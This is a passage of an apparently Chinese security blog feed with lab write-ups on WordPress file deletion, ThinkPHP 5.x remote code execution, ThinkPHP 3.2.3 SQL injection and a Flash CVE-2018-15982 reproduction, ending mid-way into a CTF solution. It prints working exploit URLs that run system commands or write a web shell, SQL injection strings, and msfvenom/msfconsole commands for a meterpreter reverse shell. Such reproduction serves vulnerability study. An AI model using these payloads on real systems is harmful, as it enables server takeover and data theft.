class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>wp_delete_attachment</code>方法中，对于传入的<code>$meta[&#39;thumb&#39;]</code>未进行任何过滤，直接调用了<code>unlick</code>，而<code>$meta[&#39;thumb&#39;]</code>存在数据库中是一个自定义字段代替了文件名，是图片的属性之一，也就是说只要控制了<code>$meta[&#39;thumb&#39;]</code>就能够控制想要删除的文件</p><p>在这个<code>post.php</code>文件中本应该还有下面这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($action) &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> <span class="string">'editattachment'</span>:</span><br><span class="line">check_admin_referer(<span class="string">'update-post_'</span> . $post_id);</span><br><span class="line">...</span><br><span class="line"><span class="comment">// Update the thumbnail filename</span></span><br><span class="line">$newmeta = wp_get_attachment_metadata( $post_id, <span class="keyword">true</span> );</span><br><span class="line">$newmeta[<span class="string">'thumb'</span>] = $_POST[<span class="string">'thumb'</span>];</span><br><span class="line">wp_update_attachment_metadata( $post_id, $newmeta );</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到当<code>$action=editattachment</code>时，<code>$newmeta[&#39;thumb&#39;]</code>的值来自于<code>$_POST[&#39;thumb&#39;]</code>,也就是说该值是可控的，且并未经过任何过滤直接保存到了<code>wp_update_attachment_metadata</code>数据库当中，所以上面分析的<code>$meta[&#39;thumb&#39;]</code>也是可控的，那么就能够达到任意文件删除的目的</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>利用此漏洞可以使攻击者能够删除WordPress安装的任何文件，像是数据库配置文件wp-config.php,<code>.htaccess</code>，该文件包含与安全性相关的约束，删除此文件将停用这些约束。还有像是index.php文件等。</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>更新Wordpress到4.9.7及以上的版本</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.ripstech.com&#x2F;2018&#x2F;wordpress-file-delete-to-code-execution&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;u&#x2F;4315114&#x2F;blog&#x2F;3914760</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Wordpress-lt-4-9-6-任意文件删除漏洞&quot;&gt;&lt;a href=&quot;#Wordpress-lt-4-9-6-任意文件删除漏洞&quot; class=&quot;headerlink&quot; title=&quot;Wordpress &amp;lt;= 4.9.6 任意文件删除漏洞&quot;&gt;&lt;/a&gt;Wordpress &amp;lt;= 4.9.6 任意文件删除漏洞
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>tp5.0-RCE</title>
    <link href="http://yoursite.com/2020/10/28/tp5-0-RCE/"/>
    <id>http://yoursite.com/2020/10/28/tp5-0-RCE/</id>
    <published>2020-10-28T06:57:06.000Z</published>
    <updated>2020-10-28T11:41:09.798Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tp5-0-amp-5-1远程RCE"><a href="#tp5-0-amp-5-1远程RCE" class="headerlink" title="tp5.0&amp;5.1远程RCE"></a>tp5.0&amp;5.1远程RCE<a id="more"></a></h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thinkphp v5<span class="number">.1</span><span class="number">.29</span></span><br><span class="line">php7<span class="number">.0</span><span class="number">.12</span>+Apache2</span><br></pre></td></tr></table></figure><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2018年12月9日，<code>ThinkPHP</code>团队发布了一个补丁更新，修复了一处由于路由解析缺陷导致的代码执行漏洞。该漏洞危害程度非常高，默认环境配置即可导致远程代码执行。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li><code>ThinkPHP 5.0.5-5.0.22</code></li><li><code>ThinkPHP 5.1.0-5.1.30</code></li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据漏洞介绍，该漏洞是由于路由解析导致的，先来看一下取路由的文件</p><p><code>thinkphp/library/think/Request.php</code></p><img src="/2020/10/28/tp5-0-RCE/1.png" class=""><p>这里传入的参数<code>var_pathinfo</code>,可以去配置文件中看看</p><img src="/2020/10/28/tp5-0-RCE/2.png" class=""><p><code>pathinfo</code>的值将会是以GET方式传给形参s的，追踪<code>pathinfo()</code>调用情况</p><p>在同一个文件下的<code>path()</code>方法中进行了调用</p><img src="/2020/10/28/tp5-0-RCE/3.png" class=""><p><code>path()</code>函数对传进来的<code>pathinfo</code>参数值进行了过滤，最后赋给了<code>$this-&gt;path</code>并且返回该值</p><p>追踪调用<code>path()</code>函数的地方，来到了<code>thinkphp/library/think/App.php</code></p><img src="/2020/10/28/tp5-0-RCE/4.png" class=""><p>这里进行了路由检测，返回一个Dispatch对象，跟一下check函数</p><img src="/2020/10/28/tp5-0-RCE/5.png" class=""><p>这里的Check函数最后返回的是一个实例化的<code>UrlDispatch</code>对象，传递了<code>$url</code>，跟一下<code>UrlDispatch</code>类</p><img src="/2020/10/28/tp5-0-RCE/6.png" class=""><p>传入的<code>$dispatch</code>被赋值给了<code>$this-&gt;dispatch</code>，跟一下<code>$this-&gt;dispatch</code>的最后处理，跟到了<code>init()</code>方法</p><img src="/2020/10/28/tp5-0-RCE/7.png" class=""><p><code>$this-&gt;dispatch</code>经过了<code>parseUrl</code>方法的检测，跟进，发现又传给了<code>parseUrlPath</code>,继续跟进</p><img src="/2020/10/28/tp5-0-RCE/8.png" class=""><p>利用<code>/</code>对<code>$url</code>变量进行分割，且<code>$url</code>的格式为‘模块/控制器/操作’，将<code>$url</code>分割后的值存放在<code>$path</code>变量当中，并返回到<code>parseUrl()</code>函数，最终返回到<code>Url</code>类中<code>init()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br></pre></td></tr></table></figure><p>路由信息数组传递到$result变量中，之后传递给了<code>Module</code>,<code>Module</code>的父类也是<code>Dispatch</code>，<code>$result</code>值传递给了变量<code>$this-&gt;dispatch</code>，随后调用<code>Module</code>类的<code>init()</code>函数对<code>$this-&gt;dispatch</code>进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($module &amp;&amp; $available) &#123;</span><br><span class="line">                <span class="comment">// 初始化模块</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;request-&gt;setModule($module);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;app-&gt;init($module);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'module not exists:'</span> . $module);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>模块初始化需要让<code>$available</code>为true，也就是<code>is_dir($this-&gt;app-&gt;getAppPath(). $module)</code>要成立，默认模块是即入口函数为<code>index</code>,<code>$this-&gt;dispatch</code>的值最终传递到<code>$this-&gt;controller</code>中，<code>init()</code>函数处理完过后，进入exec()函数,跟进</p><img src="/2020/10/28/tp5-0-RCE/9.png" class=""><p><code>$this-&gt;controller()</code>被传递给了<code>controller()</code>函数，跟进</p><img src="/2020/10/28/tp5-0-RCE/10.png" class=""><p><code>$name</code>可控，调用<code>parseModuleAndClass()</code>函数进行处理，继续跟进</p><img src="/2020/10/28/tp5-0-RCE/11.png" class=""><p><code>$name</code>只要有<code>\</code>，就赋给<code>$class</code>,实例化之后返回，在函数中执行完之后返回到<code>controller</code>中</p><img src="/2020/10/28/tp5-0-RCE/12.png" class=""><p>由于存在<code>$class</code>，接下去就会调用<code>__get()</code>魔术方法并返回，跟一下<code>__get()</code>魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;make($name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用了<code>make</code>方法，跟进</p><p>make()将传入的传入的变量实例化为一个类，即<code>controller()</code>中<code>$name</code>为我们可以控制的值，可以通过构造<code>$name</code>变量来实例化任何一个类，所以我们可以通过构造<code>s=index/\think\class/method</code>来实例化<code>\think\class</code>类并且执行该类的method方法达到控制程序流</p><img src="/2020/10/28/tp5-0-RCE/13.png" class=""><p>在<code>think/Request.php</code>中找到<code>input</code>方法，可以构造payload了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;index&#x2F;think\Request&#x2F;input&amp;filter&#x3D;phpinfo&amp;data&#x3D;1</span><br></pre></td></tr></table></figure><img src="/2020/10/28/tp5-0-RCE/14.png" class=""><p>在<code>\think\template\driver\file</code>类中找到可以任意写文件的方法write</p><img src="/2020/10/28/tp5-0-RCE/15.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;index&#x2F;think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>这样就可以在根目录写入shell了</p><h3 id="5-0版本poc"><a href="#5-0版本poc" class="headerlink" title="5.0版本poc"></a>5.0版本poc</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令执行：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]</span><br><span class="line">文件写入：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>具体的利用就用上面的<code>poc</code>对应版本就可以打了，下面是5.1写shell文件的示例</p><img src="/2020/10/28/tp5-0-RCE/16.png" class=""><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>使用更高版本的<code>thinkphp</code>框架</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;760&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;46ceb2c338bc?from&#x3D;groupmessage</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;tp5-0-amp-5-1远程RCE&quot;&gt;&lt;a href=&quot;#tp5-0-amp-5-1远程RCE&quot; class=&quot;headerlink&quot; title=&quot;tp5.0&amp;amp;5.1远程RCE&quot;&gt;&lt;/a&gt;tp5.0&amp;amp;5.1远程RCE
    
    </summary>
    
    
    
      <category term="tp" scheme="http://yoursite.com/tags/tp/"/>
    
  </entry>
  
  <entry>
    <title>tp3.2_find_select_delete_sql</title>
    <link href="http://yoursite.com/2020/10/27/tp3-2-find-select-delete-sql/"/>
    <id>http://yoursite.com/2020/10/27/tp3-2-find-select-delete-sql/</id>
    <published>2020-10-27T10:28:53.000Z</published>
    <updated>2020-10-28T03:07:43.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tp历史版本漏洞"><a href="#tp历史版本漏洞" class="headerlink" title="tp历史版本漏洞"></a>tp历史版本漏洞<a id="more"></a></h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.thinkphp.cn&#x2F;download&#x2F;610.html</span><br><span class="line">下载解压缩放在phpstudy的www目录下</span><br></pre></td></tr></table></figure><p>配置数据库</p><p><code>thinkphp_3.2.3_full\Application\Common\Conf\config.php</code></p><img src="/2020/10/27/tp3-2-find-select-delete-sql/1.png" class=""><p>搭建测试数据库，表结构如图</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/2.png" class=""><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看到添加的方法<code>test()</code></p><img src="/2020/10/27/tp3-2-find-select-delete-sql/6.png" class=""><p>跟进获取id的方法<code>I</code>,这里进行了一次<code>htmlspecialchars</code>和<code>think_filter</code>过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span><span class="params">(&amp;$value)</span></span>&#123;</span><br><span class="line"><span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"><span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))&#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其实过滤的并不严格</p><p>接着就是跟进<code>find</code>方法</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/7.png" class=""><p>可以看到在<code>find</code>方法中会进入<code>__parseOptions</code>方法，跟进一下</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/8.png" class=""><p>这里可以看到<code>select</code>，后面的正常数据也未进行处理，导致注入</p><p>重点回到<code>__parseOptions</code>方法中的字段类型验证，如果<code>is_array($options[&#39;where&#39;])</code>这个条件满足，那么我们注入的<code>SQL</code>语句都会被<code>_parseType</code> 进行强转，如果是id[where]则导致不满足，产生注入</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>thinkphp_3.2.3_full\Application\Home\Controller\IndexController.class.php</code>添加一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       $id = i(<span class="string">'id'</span>);</span><br><span class="line">       $res = M(<span class="string">'user'</span>)-&gt;find($id);</span><br><span class="line">       <span class="comment">//$res = M('user')-&gt;delete($id);</span></span><br><span class="line">       <span class="comment">//$res = M('user')-&gt;select($id);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对于<code>select()</code>和<code>find()</code>方法，有较多可注入点，可以追踪<code>parseSql</code>来进行查看</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/3.png" class=""><p>下面的exp是<code>table、alias、where</code>的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">table:m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%<span class="number">201</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br><span class="line">alias:m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%<span class="number">201</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br><span class="line">where:m=Home&amp;c=Index&amp;a=test&amp;id[where]=<span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br></pre></td></tr></table></figure><img src="/2020/10/27/tp3-2-find-select-delete-sql/4.png" class=""><p>对于<code>delete,</code>,<code>table,alias,where，在使用table和alias的时候，同时还必须保证where不为空</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">where: http:<span class="comment">//127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"></span><br><span class="line">alias: http:<span class="comment">//127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"></span><br><span class="line">table: http:<span class="comment">//127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span></span><br></pre></td></tr></table></figure><img src="/2020/10/27/tp3-2-find-select-delete-sql/5.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;tp历史版本漏洞&quot;&gt;&lt;a href=&quot;#tp历史版本漏洞&quot; class=&quot;headerlink&quot; title=&quot;tp历史版本漏洞&quot;&gt;&lt;/a&gt;tp历史版本漏洞
    
    </summary>
    
    
    
      <category term="tp" scheme="http://yoursite.com/tags/tp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-15982</title>
    <link href="http://yoursite.com/2020/10/23/CVE-2018-15982/"/>
    <id>http://yoursite.com/2020/10/23/CVE-2018-15982/</id>
    <published>2020-10-23T09:44:46.000Z</published>
    <updated>2020-10-23T10:59:27.874Z</updated>
    
    <content type="html"><![CDATA[<h2 id="adobe-flasher远程命令执行漏洞"><a href="#adobe-flasher远程命令执行漏洞" class="headerlink" title="adobe flasher远程命令执行漏洞"></a>adobe flasher远程命令执行漏洞<a id="more"></a></h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2018年11月29日，某团队在全球范围内第一时间发现一起针对俄罗斯的APT攻击行动，通过一份俄文内容的医院员工问卷文档，携带最新的Flash <code>0day</code>漏洞和具有自毁功能的专属木马程序，该漏洞允许攻击者恶意制作的Flash对象在受害者的计算机上执行代码，从而获取对系统命令行的访问权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><code>AdobeFlash Player &lt;= 31.0.0.153</code></p><p><code>AdobeFlash Player Installer&lt;= 31.0.0.108</code></p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机:Linux kali</span><br><span class="line">靶机:搭载adobeFlash29的windows7 x64</span><br></pre></td></tr></table></figure><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取CVE网上公开的poc</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;CVE-2018-15982_EXP</span><br></pre></td></tr></table></figure><p>根据网上公开的payload，创建payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=123 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;86.bin</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=123 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;64.bin</span><br></pre></td></tr></table></figure><p>这会生成对应的两个对应的<code>bin</code>可执行文件，但是在后续发现payload有问题，并且公开文章中反弹shell的截图都比较，emm，所以只有自己测试。经过不断测试，修改了payload，下面的payload是得到shell的,也就是生成<code>meterpreter</code>反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;86.bin</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;64.bin</span><br></pre></td></tr></table></figure><img src="/2020/10/23/CVE-2018-15982/1.png" class=""><p>得到<code>bin</code>文件之后，调用<code>poc</code>脚本生成对应的文件</p><p>在调用之后将生成的文件移到web服务路径下</p><img src="/2020/10/23/CVE-2018-15982/2.png" class=""><p>开启web服务，访问一下本地服务</p><img src="/2020/10/23/CVE-2018-15982/3.png" class=""><p>可以成功访问到刚刚生成的<code>index.html</code>文件，下面开启监听，这里接触到一个之前并不了解的工具，<code>msfconsole</code>控制台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">拓展：</span><br><span class="line">Msfconsole提供了一个一体化的集中控制台。通过msfconsole，你可以访问和使用所有的metasploit的插件，payload，利用模块，post模块等等。Msfconsole还有第三方程序的接口，比如nmap，sqlmap等，可以直接在msfconsole里面使用。</span><br><span class="line">具体的可以看看这篇文章</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xianjie0318&#x2F;article&#x2F;details&#x2F;81482209https:&#x2F;&#x2F;blog.csdn.net&#x2F;xianjie0318&#x2F;article&#x2F;details&#x2F;81482209</span><br></pre></td></tr></table></figure><p>下面启用<code>msfconsole</code>控制台之后进行payload等设置进行监听，<code>linux</code>终端挨个调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp_rc4</span><br><span class="line">set lport 4444</span><br><span class="line">set lhost ip</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2020/10/23/CVE-2018-15982/4.png" class=""><p>在靶机中用IE浏览器访问攻击机的<code>ip</code>地址，成功弹回shell</p><img src="/2020/10/23/CVE-2018-15982/5.png" class=""><p>下面可以看一下靶机的相关信息，像是拥有者，桌面文件</p><img src="/2020/10/23/CVE-2018-15982/6.png" class=""><p><code>GITHUB</code>上给的payload弹的是一个本地的计算器，这里直接进行尝试，切换到shell下</p><img src="/2020/10/23/CVE-2018-15982/7.png" class=""><img src="/2020/10/23/CVE-2018-15982/8.png" class=""><p>还可以往其他硬盘中写入文件，在D盘根目录下写入<code>peguin.txt</code>，写点东西进去</p><img src="/2020/10/23/CVE-2018-15982/9.png" class=""><img src="/2020/10/23/CVE-2018-15982/10.png" class=""><h2 id="复现总结"><a href="#复现总结" class="headerlink" title="复现总结"></a>复现总结</h2><p>这次复现过程比较曲折，adobe由于即将下线关于历史版本的下载页面已经下线，找到符合复现环境的adobe版本就花了挺长时间。其次公开的payload文章给的payload不能直接利用，开始没有想到修改payload，还是自己的原因</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Adobe官方已经发布新版本修复了上述漏洞，用户应及时升级进行防护。</p><p>下载更新地址：<a href="https://get.adobe.com/flashplayer" target="_blank" rel="noopener">https://get.adobe.com/flashplayer</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考链接</span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;197760.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xuandao_ahfengren&#x2F;article&#x2F;details&#x2F;86532740</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;adobe-flasher远程命令执行漏洞&quot;&gt;&lt;a href=&quot;#adobe-flasher远程命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;adobe flasher远程命令执行漏洞&quot;&gt;&lt;/a&gt;adobe flasher远程命令执行漏洞
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>n1ctf2020</title>
    <link href="http://yoursite.com/2020/10/20/n1ctf2020/"/>
    <id>http://yoursite.com/2020/10/20/n1ctf2020/</id>
    <published>2020-10-20T12:02:37.000Z</published>
    <updated>2020-10-21T05:15:47.019Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛难度挺大的，也有收获，继续加油<a id="more"></a></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>盲注</li><li>序列化</li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip =$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"********"</span>,<span class="string">"n1ctf_websign"</span>);</span><br><span class="line">        $sqlquery=sprintf(<span class="string">"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')"</span>,<span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]),time());</span><br><span class="line">        <span 